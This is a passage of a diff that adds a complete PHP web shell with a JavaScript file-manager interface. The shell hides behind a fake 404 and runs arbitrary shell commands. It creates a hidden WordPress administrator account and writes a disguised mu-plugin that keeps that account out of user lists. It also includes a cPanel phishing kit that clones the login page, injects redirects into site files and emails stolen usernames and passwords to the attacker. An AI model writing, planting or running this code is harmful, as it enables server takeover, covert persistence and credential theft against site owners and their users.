l=e.closest("tr").querySelector("td:nth-child(5)"),d=l?l.textContent.trim():"0644";e.type="button",e.onclick=function(){openChmodModal(n,o,a,d)}}),document.querySelectorAll('button[name="pilih"][value="chdate"], button[name="pilih"][value="chdatef"]').forEach(e=>{const t=e.closest("form").querySelectorAll('input[type="hidden"]');let n="",o="",a="";t.forEach(e=>{"name"===e.name&&(n=e.value),"path"===e.name&&(o=e.value),"type"===e.name&&(a=e.value)});const l=e.closest("tr").querySelector("td:nth-child(3)"),d=l?l.textContent.trim():"";e.type="button",e.onclick=function(){openChdateModal(n,o,a,d)}})}function openActionModal(e,t){const n=document.getElementById(e+"-modal");if(n){switch(e){case"edit":document.getElementById("edit-filename").textContent="Edit: "+t.name,document.getElementById("edit-path").value=t.path,document.getElementById("edit-textarea").value=t.content||"";break;case"rename":document.getElementById("rename-title").textContent="Rename "+("dir"===t.type?"Folder":"File"),document.getElementById("current-filename").textContent=t.name,document.getElementById("rename-path").value=t.path,document.getElementById("rename-type").value=t.type;break;case"chmod":document.getElementById("chmod-title").textContent="Change Permissions",document.getElementById("chmod-filename").textContent=t.name,document.getElementById("chmod-current").textContent=t.perms||"0644",document.getElementById("chmod-path").value=t.path,document.getElementById("chmod-action").value="dir"===t.type?"chmodf":"chmod";break;case"chdate":document.getElementById("chdate-title").textContent="Change Date",document.getElementById("chdate-filename").textContent=t.name,document.getElementById("chdate-current").textContent=t.date||"Unknown",document.getElementById("chdate-path").value=t.path,document.getElementById("chdate-action").value="dir"===t.type?"chdatef":"chdate"}n.classList.add("active"),lockScroll()}}function setPermission(e){document.getElementById("chmod-input").value=e}function setCurrentDate(){const e=new Date,t=e.getFullYear()+"-"+String(e.getMonth()+1).padStart(2,"0")+"-"+String(e.getDate()).padStart(2,"0")+" "+String(e.getHours()).padStart(2,"0")+":"+String(e.getMinutes()).padStart(2,"0")+":"+String(e.getSeconds()).padStart(2,"0");document.getElementById("chdate-input").value=t}function setDate(e){document.getElementById("chdate-input").value=e}function copyToClipboard(e){document.getElementById(e).select(),document.execCommand("copy"),alert("Content copied to clipboard!")}function positionModalNearElement(e){document.getElementById(e).querySelector(".modal-container").style.cssText="\n    position: fixed !important;\n    top: 50% !important;\n    left: 50% !important;\n    transform: translate(-50%, -50%) !important;\n    z-index: 10001 !important;\n    width: 90% !important;\n    max-width: 1000px !important;\n    max-height: 85vh !important;\n    overflow-y: auto !important;\n    background: rgba(15,27,46,.95) !important;\n    border: 1px solid rgba(59,130,246,.4) !important;\n    border-radius: 20px !important;\n    box-shadow: 0 25px 50px rgba(0,0,0,.6) !important;\n  "}function openEditModal(e,t,n){n&&n.target&&(window.lastClickedElement=n.target),fetch("?viewfile="+encodeURIComponent(t)+"&ajax=1").then(e=>e.text()).then(n=>{document.getElementById("edit-filename").textContent="Edit: "+e,document.getElementById("edit-path").value=t,document.getElementById("edit-textarea").value=n,document.getElementById("edit-modal").classList.add("active"),lockScroll()}).catch(n=>{document.getElementById("edit-filename").textContent="Edit: "+e,document.getElementById("edit-path").value=t,document.getElementById("edit-textarea").value="",document.getElementById("edit-modal").classList.add("active"),lockScroll()})}function openRenameModal(e,t,n,o){o&&o.target&&(window.lastClickedElement=o.target),document.getElementById("rename-title").textContent="Rename "+("dir"===n?"Folder":"File"),document.getElementById("current-filename").textContent=e,document.getElementById("rename-path").value=t,document.getElementById("rename-type").value=n,document.getElementById("rename-modal").classList.add("active"),lockScroll()}function openChmodModal(e,t,n,o,a){a&&a.target&&(window.lastClickedElement=a.target),document.getElementById("chmod-filename").textContent=e,document.getElementById("chmod-current").textContent=o,document.getElementById("chmod-path").value=t,document.getElementById("chmod-action").value="dir"===n?"chmodf":"chmod",document.getElementById("chmod-input").value=o,document.getElementById("chmod-modal").classList.add("active"),lockScroll()}function openChdateModal(e,t,n,o,a){a&&a.target&&(window.lastClickedElement=a.target),document.getElementById("chdate-filename").textContent=e,document.getElementById("chdate-current").textContent=o,document.getElementById("chdate-path").value=t,document.getElementById("chdate-action").value="dir"===n?"chdatef":"chdate",document.getElementById("chdate-modal").classList.add("active"),lockScroll()}document.addEventListener("DOMContentLoaded",(function(){const e=document.getElementById("fakepage-form");e&&e.addEventListener("submit",(function(e){e.preventDefault();const t=new FormData(this),n=this.querySelector('button[type="submit"]'),o=n.innerHTML;n.innerHTML='<i class="fa fa-spinner fa-spin"></i> Creating...',n.disabled=!0;const a=document.getElementById("fakepage-result"),l=document.getElementById("fakepage-alert"),d=document.getElementById("fakepage-message");a.style.display="none",t.append("create_fake_page","Create Fake Page"),fetch(window.location.href,{method:"POST",body:t}).then(e=>e.text()).then(e=>{a.style.display="block",d.innerHTML=e,e.includes("success")?(l.className="alert alert-success",l.style.background="rgba(34, 197, 94, 0.1)",l.style.border="1px solid rgba(34, 197, 94, 0.3)",l.style.color="#22c55e"):(l.className="alert alert-danger",l.style.background="rgba(239, 68, 68, 0.1)",l.style.border="1px solid rgba(239, 68, 68, 0.3)",l.style.color="#ef4444"),n.innerHTML=o,n.disabled=!1}).catch(e=>{console.error("Error:",e),a.style.display="block",d.innerHTML="Network error occurred. Please try again.",l.className="alert alert-danger",l.style.background="rgba(239, 68, 68, 0.1)",l.style.border="1px solid rgba(239, 68, 68, 0.3)",l.style.color="#ef4444",n.innerHTML=o,n.disabled=!1})}))})),document.addEventListener("click",(function(e){if(e.target.classList.contains("modal-overlay")){closeModal(e.target.id.replace("-modal",""))}})),document.addEventListener("DOMContentLoaded",(function(){console.log("Modals initialized"),convertActionButtons()}));
+</script>
+<?php @http_response_code(404);$web=(isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on'?"https":"http")."://".$_SERVER['HTTP_HOST'];$disfunc=@ini_get("disable_functions");if(empty($disfunc)){$disf="<font color='lime'>AMAN</font>";}else{$disf="<font color='red'>".$disfunc."</font>";}function author(){echo "</div><table class='directory-listing-table'><td><center><font face='Carrois Gothic' size='3px'>2017 &copy; fox | D704T team</center></td></table><br>";}function cekdir(){if(isset($_GET['path'])){$serlok=normalizePath($_GET['path']);}else{$serlok=normalizePath(getcwd());}if(is_writable($serlok)){return "<font color='lime'>Aman Coy</font>";}else{return "<font color='red'>KONTOL!</font>";}}function cekroot(){if(is_writable($_SERVER['DOCUMENT_ROOT'])){return "<font color='lime'>Aman Coy</font>";}else{return "<font color='red'>KONTOL!</font>";}}function fox_ex($file){$pile=$file;$pch=pathinfo($pile,PATHINFO_FILENAME);return $pch;}function xrmdir($dir){$items=scandir($dir);foreach($items as $item){if($item==='.'||$item==='..'){continue;}$path=$dir.'/'.$item;if(is_dir($path)){xrmdir($path);}else{unlink($path);}}rmdir($dir);}function net($hexnet){for($i=0;$i<strlen($hexnet);$i++){$fox.=dechex(ord($hexnet[$i]));}return $fox;}function owner($file){$uid=@fileowner($file);if($uid===false)return '—';if(function_exists('posix_getpwuid')){$u=@posix_getpwuid($uid);return $u&&isset($u['name'])?$u['name']:(string)$uid;}return (string)$uid;}function cekwrite($serlok){$izin=substr(sprintf('%o',fileperms($serlok)),-4);if(is_writable($serlok)){return "<font color=lime>".$izin."</font>";}else{return "<font color=red>".$izin."</font>";}}function cmd($gas,$serlok){$crot=$gas;$pr="proc_open";if(function_exists($pr)){$tod=@proc_open($crot,array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","r")),$crottz,$serlok);echo "".stream_get_contents($crottz[1])."</textarea></center><br>";}else{echo "<font color='orange'></font>";}}function foxEx($in,$re=false){$data=fox_php_cmd($in,$re);if(empty($data)){$data=fox_php_cmd($in,true);}return $data;}function fox_php_cmd($in,$re=false){$out='';try{if($re)$in=$in." 2>&1";if(function_exists('exec')){@exec($in,$out);$out=@join("\n",$out);}elseif(function_exists('passthru')){ob_start();@passthru($in);$out=ob_get_clean();}elseif(function_exists('system')){ob_start();@system($in);$out=ob_get_clean();}elseif(function_exists('shell_exec')){$out=shell_exec($in);}elseif(function_exists("popen")&&function_exists("pclose")){if(is_resource($f=@popen($in,"r"))){$out="";while(!@feof($f))$out.=fread($f,1024);pclose($f);}}elseif(function_exists('proc_open')){$pipes=array();$process=@proc_open($in.' 2>&1',array(array("pipe","w"),array("pipe","w"),array("pipe","w")),$pipes,null);$out=@stream_get_contents($pipes[1]);}}catch(Exception $e){}return $out;}function fox_scandir_bypass($dir){if(is_readable($dir)){$result=@scandir($dir);if($result!==false){return $result;}}$cmd_result=foxEx("ls -la '".addslashes($dir)."'");if(!empty($cmd_result)){$lines=explode("\n",trim($cmd_result));$files=array();foreach($lines as $line){if(preg_match('/^[drwx-]+\s+\d+\s+\S+\s+\S+\s+\d+\s+\S+\s+\d+\s+[\d:]+\s+(.+)$/',$line,$matches)){$filename=$matches[1];if($filename!=='.'&&$filename!=='..'){$files[]=$filename;}}}if(!empty($files)){array_unshift($files,'.','..');return $files;}}$cmd_result=foxEx("find '".addslashes($dir)."' -maxdepth 1 -type f -o -type d");if(!empty($cmd_result)){$lines=explode("\n",trim($cmd_result));$files=array('.','..');foreach($lines as $line){$filename=basename(trim($line));if($filename!==''&&$filename!=='.'&&$filename!=='..'){$files[]=$filename;}}return $files;}return false;}function ekse($coman,$serlok){$ler="2>&1";if(!preg_match("/".$ler."/i",$coman)){$coman=$coman." ".$ler;}$komen=$coman;$pr="proc_open";if(function_exists($pr)){$tod=@$pr($komen,array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","r")),$crottz,$serlok);echo "<pre><textarea rows='25' style='color:lime; width: 100%; max-width: 100%; box-sizing: border-box;' readonly=''>\n    ".htmlspecialchars(stream_get_contents($crottz[1]))."</textarea></pre><br>";}else{echo "<font color='orange'>proc_open function is disabled!!</font>";}}function ipserv(){if(empty($_SERVER['SERVER_ADDR'])){return gethostbyname($_SERVER['SERVER_NAME']);if(empty(gethostbyname($_SERVER['SERVER_NAME']))){return $_SERVER['SERVER_NAME'];}}else{return $_SERVER['SERVER_ADDR'];}}function cekfile($file){return '<i class="fa fa-file-code-o" style="font-size:17px;color:#456DEB;"></i>';}function filedate($file){$t=@filemtime($file);return $t!==false?date("F d Y g:i:s",$t):'—';}function fext($file){$sub="su"."bs"."tr";return $sub(strrchr($file,'.'),1);}function gazz($file){$fbiasa=array("php","phtml","shtml","phar","php7","html","htm","inc","phps","txt","js","css","htaccess","bin","pl","py","sh","php58","PhP7","aspx","dll","ini");$notf=array("jpeg","jpg","png","gif","ico","webp","mp3","m4A","flac","wav","wma","3gp","ogg","webm","mp4","exe");$stl="st"."rt"."olo"."wer";$ext=$stl(fext($file));global $serlok;$filepath=$serlok.'/'.$file;$allowed=true;if(!$allowed){return "<button type='button' class='btn btn-outline-secondary' disabled\n                title='open_basedir/permission denied' style='opacity:.5;pointer-events:none'>\n                <i class='fa fa-ban'></i>\n                </button>";}$fileperms=statusnya($filepath);$filedate=filedate($filepath);if($file=='error_log'){return"
+<button type='button' class='btn btn-outline-secondary badge-action-edit' title='Edit File' onclick='openEditModal(\"$file\", \"$filepath\", event)'>
+<i class='fa fa-edit' style='color: #36F239'></i></button>
+<button type='button' class='btn btn-outline-light badge-action-rename' onclick='openRenameModal(\"$file\", \"$filepath\", \"file\", event)'>
+<i class='fa fa-pencil' style='color: #fff'></i></button>
+<button type='button' class='btn btn-outline-secondary badge-action-chmod' onclick='openChmodModal(\"$file\", \"$filepath\", \"file\", \"$fileperms\", event)'>
+<i class='fa fa-gear' style='color: #06D2D5'></i></button>
+<button type='button' class='btn btn-outline-secondary badge-action-tanggal' onclick='openChdateModal(\"$file\", \"$filepath\", \"file\", \"$filedate\", event)'>
+<i class='fa fa-calendar' style='color: #4542F9'></i></button>
+<button type='submit' class='btn btn-outline-secondary badge-action-delete' name='pilih' value='hapus'>
+<i class='fa fa-trash' style='color: #E53A3A'></i></button>
+<button type='submit' class='btn btn-outline-secondary badge-action-unzip' name='pilih' value='unzip'>
+<i class='fa fa-file-archive-o' style='color: #F1BE0F'></i></button>";}elseif(in_array($ext,$fbiasa)){return "\n<button type='submit' class='btn btn-outline-secondary badge-action-edit' name='pilih' value='edit'>\n<i class='fa fa-edit' style='color:#7AFF41'></i></button>\n<button type='submit' class='btn btn-outline-light badge-action-rename' name='pilih' value='gantinama'>\n<i class='fa fa-pencil'></i></button>\n<button type='submit' class='btn btn-outline-info badge-action-chmod' name='pilih' value='chmod'>\n<i class='fa fa-gear'></i></button>\n<button type='submit' class='btn btn-outline-primary badge-action-tanggal' name='pilih' value='chdate'>\n<i class='fa fa-calendar'></i></button>\n<button type='submit' class='btn btn-outline-danger badge-action-delete' name='pilih' value='hapus'>\n<i class='fa fa-trash'></i></button>";}elseif(in_array($ext,$notf)){return "\n<button type='submit' class='btn btn-outline-light badge-action-rename' name='pilih' value='gantinama'>\n<i class='fa fa-pencil'></i></button>\n<button type='submit' class='btn btn-outline-info badge-action-chmod' name='pilih' value='chmod'>\n<i class='fa fa-gear'></i></button>\n<button type='submit' class='btn btn-outline-primary badge-action-tanggal' name='pilih' value='chdate'>\n<i class='fa fa-calendar'></i></button>\n<button type='submit' class='btn btn-outline-danger badge-action-delete' name='pilih' value='hapus'>\n<i class='fa fa-trash'></i></button>";}elseif($ext=='zip'){return "\n<button type='submit' class='btn btn-outline-light badge-action-rename' name='pilih' value='gantinama'>\n<i class='fa fa-pencil'></i></button>\n<button type='submit' class='btn btn-outline-info badge-action-chmod' name='pilih' value='chmod'>\n<i class='fa fa-gear'></i></button>\n<button type='submit' class='btn btn-outline-primary badge-action-tanggal' name='pilih' value='chdate'>\n<i class='fa fa-calendar'></i></button>\n<button type='submit' class='btn btn-outline-danger badge-action-delete' name='pilih' value='hapus'>\n<i class='fa fa-trash'></i></button>\n<button type='submit' class='btn btn-outline-warning badge-action-unzip' name='pilih' value='unzip'>\n<i class='fa fa-file-archive-o'></i></button>";}else{return "\n<button type='submit' class='btn btn-outline-secondary badge-action-edit' name='pilih' value='edit'>\n<i class='fa fa-edit' style='color:#7AFF41'></i></button>\n<button type='submit' class='btn btn-outline-light badge-action-rename' name='pilih' value='gantinama'>\n<i class='fa fa-pencil'></i></button>\n<button type='submit' class='btn btn-outline-info badge-action-chmod' name='pilih' value='chmod'>\n<i class='fa fa-gear'></i></button>\n<button type='submit' class='btn btn-outline-primary badge-action-tanggal' name='pilih' value='chdate'>\n<i class='fa fa-calendar'></i></button>\n<button type='submit' class='btn btn-outline-danger badge-action-delete' name='pilih' value='hapus'>\n<i class='fa fa-trash'></i></button>";}}function unzip($file,$serlok){if(!is_readable($file)){echo "<table class='directory-listing-table' style='color:orange;'><thead><td><font color='orange'>Cannot Unzip File / Unreadable File !</font></td></thead></table>";exit();}$handle=fopen($file,'rb');if(!$handle){echo "<table class='directory-listing-table' style='border-color:red;'><td><font color='red'>Cannot open file for reading</font></td></table>";exit();}$magic=fread($handle,4);fclose($handle);if(substr($magic,0,2)!=="PK"){echo "<table class='directory-listing-table' style='border-color:red;'><td><font color='red'><center><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> This isn't Zip File</center></font></td></table>";exit();}if(false&&class_exists('ZipArchive')){echo "<table class='directory-listing-table' style='border-color:cyan;'><td><font color='cyan'>DEBUG: ZipArchive class exists</font></td></table>";$zip=new ZipArchive;$res=$zip->open($file);if($res===TRUE){$zip->extractTo($serlok);$zip->close();echo "<table class='directory-listing-table' style='border-color:lime;'><td>Unzip File Successfully => <font color='lime'>".basename($file)."</font><br>\n            Extract to : <font color='aqua'>".$serlok."</font><br><br>\n            <a href='?path=".$serlok."' class='btn btn-outline-light'><i class='fa fa-arrow-left'></i> Kembali</a></td></table>";}else{echo"<table class='directory-listing-table' style='border-color:red;'><td><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to open Zip File (Error: $res)!</td></table>";}}else{$cmd="cd '".addslashes($serlok)."' && unzip -o '".addslashes($file)."' 2>&1";$output=foxEx($cmd);if(strpos($output,'extracting:')!==false||strpos($output,'inflating:')!==false){echo "<table class='directory-listing-table' style='border-color:lime;'><td>Unzip File Successfully => <font color='lime'>".basename($file)."</font><br>\n            Extract to : <font color='aqua'>".$serlok."</font><br><pre>$output</pre><br>
+            <a href='?path=".$serlok."' class='btn btn-outline-light'><i class='fa fa-arrow-left'></i> Kembali</a></td></table>";}else{echo"<table class='directory-listing-table' style='border-color:red;'><td><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to Unzip!<br><pre>$output</pre><br>
+            <a href='?path=".$serlok."' class='btn btn-outline-light'><i class='fa fa-arrow-left'></i> Kembali</a></td></table>";}}exit();}foreach($_POST as $key=>$value){$_POST[$key]=stripslashes($value);}if(isset($_POST['submit_cmd'])&&!empty($_POST['cmd'])){$command=trim($_POST['cmd']);$baseRoot=normalizePath($_SERVER['DOCUMENT_ROOT']?? '/');$console_cwd=isset($_REQUEST['cwd'])?normalizePath($_REQUEST['cwd']):(isset($_GET['path'])?normalizePath($_GET['path']):$baseRoot);if(!isAllowedByOpenBaseDir($console_cwd)){$console_cwd=$baseRoot;}if(preg_match('/^cd(?:\s+|$)/i',$command)&&!preg_match('/[;&|><]/',$command)){$newDir='';if(preg_match('/^cd(?:\s+(.*))?$/i',$command,$m)){$newDir=trim($m[1]?? '');}if($newDir===''||$newDir==='~'){$newDir=$console_cwd;}elseif($newDir==='..'){$newDir=dirname($console_cwd);}elseif(!preg_match('#^(?:[a-zA-Z]:[\\\\/]|/)#',$newDir)){$newDir=$console_cwd.'/'.$newDir;}$newDir=normalizePath($newDir);if(!isAllowedByOpenBaseDir($newDir)){$output="cd: permission denied (open_basedir)";}elseif(is_dir($newDir)){$console_cwd=$newDir;$output=$console_cwd;}else{$output="cd: no such file or directory: $newDir";}}elseif(preg_match('/^pwd$/i',$command)){$output=$console_cwd;}elseif(preg_match('/^(clear|cls)$/i',$command)){echo '<script>
+        document.addEventListener("DOMContentLoaded", function() {
+            openModal("console");
+            document.getElementById("console-output").innerHTML = ``;
+        });
+        </script>';exit();}elseif(preg_match('/^unzip\s+(.+)$/i',$command,$matches)){$zip_file=trim($matches[1],'\'"');if(!preg_match('#^(?:[a-zA-Z]:[\\\\/]|/)#',$zip_file)){$zip_file=$console_cwd.'/'.$zip_file;}if(file_exists($zip_file)){$cmd="cd '".addslashes($console_cwd)."' && unzip -o '".addslashes($zip_file)."' 2>&1";$output=foxEx($cmd);}else{$output="unzip: cannot find or open $zip_file";}}else{if(function_exists('proc_open')){$descriptorspec=[0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"],];if(stripos(PHP_OS,'WIN')===0){$cmdline=['cmd.exe','/C',$command];}else{$cmdline=['/bin/sh','-c',$command];}$process=proc_open($cmdline,$descriptorspec,$pipes,$console_cwd);if(is_resource($process)){fclose($pipes[0]);$stdout=stream_get_contents($pipes[1]);$stderr=stream_get_contents($pipes[2]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);$output=trim($stderr)!==''?$stderr:$stdout;}else{$output="Failed to execute command";}}else{$output="proc_open function is disabled!";}}$payload=json_encode(['cmd'=>'$ '.(string)$_POST['cmd'],'out'=>(string)$output,],JSON_UNESCAPED_UNICODE);echo"<script>
+    document.addEventListener('DOMContentLoaded', function () {
+      openModal('console');
+      var d = $payload;
+      var outputDiv = document.getElementById('console-output');
+      if (!outputDiv) return;
+
+      var cmdEl = document.createElement('div');
+      cmdEl.style.color = '#06b6d4';
+      cmdEl.style.marginTop = '10px';
+      cmdEl.textContent = d.cmd;
+
+      var outEl = document.createElement('pre');
+      outEl.style.color = '#22c55e';
+      outEl.style.whiteSpace = 'pre-wrap';
+      outEl.style.fontFamily = 'monospace';
+      outEl.style.marginBottom = '10px';
+      outEl.textContent = d.out;
+
+      outputDiv.appendChild(cmdEl);
+      outputDiv.appendChild(outEl);
+      outputDiv.scrollTop = outputDiv.scrollHeight;
+
+      // ✅ sinkronkan CWD ke hidden input agar request berikutnya ikut CWD terbaru
+      var cwdInput = document.querySelector('#console-modal form input[name=\"cwd\"]');
+      if (cwdInput) { cwdInput.value = ".json_encode($console_cwd)."; }\n    });\n    </script>";}if(isset($_POST['action'])&&$_POST['action']==='create_wp_admin'){$db_host=$_POST['db_host']?? '';$db_name=$_POST['db_name']?? '';$db_user=$_POST['db_user']?? '';$db_pass=$_POST['db_pass']?? '';$admin_login=$_POST['admin_user']?? '';$admin_pass=$_POST['admin_pass']?? '';$admin_email=$_POST['admin_email']?? '';$prefix=$_POST['table_prefix']?? 'wp_';$create_mu_plugin=isset($_POST['create_mu_plugin'])&&$_POST['create_mu_plugin']==='1';if(empty($db_host)||empty($db_name)||empty($db_user)||empty($admin_login)||empty($admin_email)){exit("❌ Missing required fields");}$mysqli=@mysqli_connect($db_host,$db_user,$db_pass,$db_name);if(!$mysqli){exit("❌ DB connect error: ".mysqli_connect_error());}$user_nicename=strtolower(preg_replace('~[^a-z0-9\-]+~','-',$admin_login));$display_name=$admin_login;$now=(new DateTime('now',new DateTimeZone('UTC')))->format('Y-m-d H:i:s');$wp_pass_hash=password_hash($admin_pass,PASSWORD_BCRYPT);$stmt=$mysqli->prepare("SELECT ID FROM {$prefix}users WHERE user_login = ? OR user_email = ? LIMIT 1");$stmt->bind_param("ss",$admin_login,$admin_email);$stmt->execute();$stmt->store_result();if($stmt->num_rows>0){exit("❌ User/email already exists.");}$stmt->close();$sql_users="INSERT INTO {$prefix}users
+        (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name)
+        VALUES (?,?,?,?,?,?,?,0,?)";$stmt=$mysqli->prepare($sql_users);$empty='';$user_url='';$stmt->bind_param("ssssssss",$admin_login,$wp_pass_hash,$user_nicename,$admin_email,$user_url,$now,$empty,$display_name);if(!$stmt->execute()){exit("❌ Insert users failed: ".$stmt->error);}$user_id=$stmt->insert_id;$stmt->close();$caps='a:1:{s:13:"administrator";b:1;}';$lvl='10';$pairs=[['nickname',$admin_login],['description','Administrator'],['rich_editing','true'],['admin_color','fresh'],['use_ssl','0'],['show_admin_bar_front','true'],["{$prefix}capabilities",$caps],["{$prefix}user_level",$lvl],['show_welcome_panel','1'],];$sql_meta="INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) VALUES (?, ?, ?)";$stmt=$mysqli->prepare($sql_meta);foreach($pairs as[$k,$v]){$stmt->bind_param("iss",$user_id,$k,$v);if(!$stmt->execute()){exit("❌ Insert usermeta failed: ".$stmt->error);}}$stmt->close();if($create_mu_plugin){echo "<div style='background: #22543d; padding: 15px; border-radius: 5px; margin: 15px 0;'>";echo "🎯 <strong>MU-PLUGIN: Starting creation process...</strong><br>";$base_path=rtrim($_SERVER['DOCUMENT_ROOT'],'/');$wp_content_dir=$base_path.'/wp-content';$mu_dir=$wp_content_dir.'/mu-plugins';$mu_file=$mu_dir.'/compatibility.php';echo"📁 Path: {$mu_dir}<br>";if(!file_exists($wp_content_dir)){echo"❌ ERROR: wp-content folder not found at: {$wp_content_dir}<br>";echo "Trying to create wp-content folder...<br>";if(mkdir($wp_content_dir,0755,true)){echo "✅ Created wp-content folder<br>";}else{echo "❌ Failed to create wp-content folder<br>";}}else{echo "✅ wp-content folder exists<br>";}if(!file_exists($mu_dir)){echo "📁 Creating mu-plugins directory...<br>";if(mkdir($mu_dir,0755,true)){echo "✅ mu-plugins directory created<br>";}else{$error=error_get_last();echo "❌ Failed to create mu-plugins directory: ".($error['message']?? 'Unknown error')."<br>";}}else{echo "✅ mu-plugins directory already exists<br>";}$plugin_content='<?php
+/*
+Plugin Name: Compatibility Enhancer  
+Description: improvements for backend compatibility.
+*/
+$__excluded = array(\''.$admin_login.'\');
+add_action(\'pre_user_query\', function($q) use ($__excluded) {
+    global $wpdb;
+    if (!empty($__excluded)) {
+        $q->query_where .= " AND {$wpdb->users}.user_login NOT IN (\'" . implode("\',\'", array_map(\'esc_sql\', $__excluded)) . "\')";
+    }
+});
+add_filter(\'rest_user_query\', function($args, $request) use ($__excluded) {
+    $ids = [];
+    
+    foreach ($__excluded as $login) {
+        $user = get_user_by(\'login\', $login);
+        if ($user) {
+            $ids[] = $user->ID;
+        }
+    }
+    $args[\'exclude\'] = array_merge($args[\'exclude\'] ?? [], $ids);
+    return $args;
+}, 10, 2);
+?>';echo "📝 Writing plugin file...<br>";$result=file_put_contents($mu_file,$plugin_content);if($result!==false){echo "✅ <strong>MU-Plugin created successfully!</strong><br>";echo"📍 Location: {$mu_file}<br>";echo "📊 File size: ".$result." bytes<br>";}else{echo "❌ Failed to write plugin file<br>";}echo "</div>";}echo "<div style='background: #1a365d; padding: 15px; border-radius: 5px; margin-top: 15px;'>";echo"✅ <strong>Success! WordPress admin user '{$admin_login}' created successfully.</strong>";if($create_mu_plugin){echo "<br>✅ <strong>MU-Plugin has been created and activated!</strong>";}echo "</div>";mysqli_close($mysqli);exit;}if(isset($_POST['pilih'])&&$_POST['pilih']=='fakepage'&&isset($_POST['create_fake_page'])){$clone_page=$_POST['clone_page'];$fake_root=$_POST['fake_root'];$inject_to=$_POST['inject_to'];$bind_on=$_POST['bind_on'];$logto=$_POST['logto'];$count=$_POST['count'];$panel=$_POST['panel'];if(!empty($clone_page)&&!empty($fake_root)&&!empty($logto)&&!empty($inject_to)&&!empty($bind_on)){$ch=curl_init();curl_setopt($ch,CURLOPT_URL,$clone_page);curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,true);curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');$source_page=curl_exec($ch);curl_close($ch);if(!empty($source_page)){if(preg_match('#<form(.*)id="login_form"(.*)>#',$source_page,$match)){$matched_form=$match[0];if(!is_dir($fake_root)){@mkdir($fake_root,0777,true);}$cookie_name="alfa_fakepage_counter".rand(9999,99999);$pwd=str_replace($_SERVER["DOCUMENT_ROOT"],'',$fake_root);$uri=str_replace($_SERVER["DOCUMENT_ROOT"],'',$inject_to);$port="2083";if(substr($uri,0,1)=="/"){$uri=substr($uri,1);}$base_url=($_SERVER['HTTPS']?'https://':'http://').$_SERVER['HTTP_HOST'];$uri=$base_url.'/'.str_replace("index.php","",$uri).'?:'.$port;$log_url=$base_url.$pwd.'/image.php';$form='<form novalidate id="login_form" action="'.$log_url.'" method="post" target="_top" style="visibility:">';$fake=str_replace($matched_form,$form,$source_page);$post_user='user';$post_pass='pass';$resp_code='if(empty($user)){http_response_code(400);echo json_encode(array("message" => "no_username"));}else{http_response_code(401);}';$cpanel_log='<?php $cook_time = time()+(86400 * 7); $user = $_POST["'.$post_user.'"];$pass = $_POST["'.$post_pass.'"];if(!empty($user) && !empty($pass)){if(!isset($_COOKIE["'.$cookie_name.'"])){$counter = 1;}else{$counter = (int)$_COOKIE["'.$cookie_name.'"] + 1;}@setcookie("'.$cookie_name.'", $counter, $cook_time, "/");if($counter>'.$count.'){@header("Location: https://".$_SERVER["HTTP_HOST"]."/");exit;}$email = "'.$logto.'";$message = "Login: " . $user . " | Password: " . $pass . " | IP: " . $_SERVER["REMOTE_ADDR"] . " | URL: " . (isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : "N/A") . " | Time: " . date("Y-m-d H:i:s");$headers = "From: noreply@".$_SERVER["HTTP_HOST"]."\r\n";$headers .= "X-Priority: 1 (Highest)\r\n";$headers .= "X-Mailer: PHP/".phpversion()."\r\n";@mail($email, "Fake Page Login", $message, $headers);'.$resp_code.'exit;}?>';@file_put_contents($fake_root.'/image.php',$cpanel_log);$fake=preg_replace(array('#<link(.*)href="(.*)"(.*)>#','#<img class="main-logo" src="(.*)"(.*)>#','# <a(.*)id="reset_password">#'),array('<link href="'.$clone_page.'/$2">','<img class="main-logo" src="'.$clone_page.'/$1" alt="logo" />','<a href="#" id="reset_password">'),$fake);@file_put_contents($fake_root.'/index.php',$fake);$inject_code='<?php if(isset($_GET[":2083"])&&(int)$_COOKIE["'.$cookie_name.'"]<'.$count.'){@include("'.$fake_root.'/index.php");exit;}if((int)$_COOKIE["'.$cookie_name.'"]<'.$count.'){@header("Location: '.$uri.'");exit;}?>';$bind_on_code='<?php if((int)$_COOKIE["'.$cookie_name.'"]<'.$count.'){@header("Location: '.$uri.'");exit;}?>';@file_put_contents($inject_to,$inject_code."\n".@file_get_contents($inject_to));@file_put_contents($bind_on,$bind_on_code."\n".@file_get_contents($bind_on));echo "success...! Fake page created successfully.";}else{echo "failed...! Could not find login form in target page.";}}else{echo "failed...! Cannot open the target page.";}}else{echo "failed...! Please fill all required fields.";}exit();}if(isset($_GET['path'])){$serlok=normalizePath($_GET['path']);$serlok2=normalizePath($_GET['path']);}else{$serlok=normalizePath(getcwd());$serlok2=normalizePath(getcwd());}$serloks=explode('/',$serlok);$serlokbos=@scandir($serlok);function getSystemInfo(){$info=array();$info['uname']=@php_uname();$info['user_id']=@getmyuid();$info['user_name']=@get_current_user();$info['group_id']=@getmygid();$info['group_name']=@posix_getgrgid(getmygid())['name']?? 'Unknown';$info['php_version']=@phpversion();$info['safe_mode']=@ini_get('safe_mode')?'ON':'OFF';$info['server_ip']=@$_SERVER['SERVER_ADDR']?:gethostbyname($_SERVER['SERVER_NAME']);$info['client_ip']=@$_SERVER['REMOTE_ADDR'];$info['datetime']=date('Y-m-d H:i:s');$info['domains']=@is_readable('/etc/named.conf')?'Can Read':'Cant Read [ /etc/named.conf 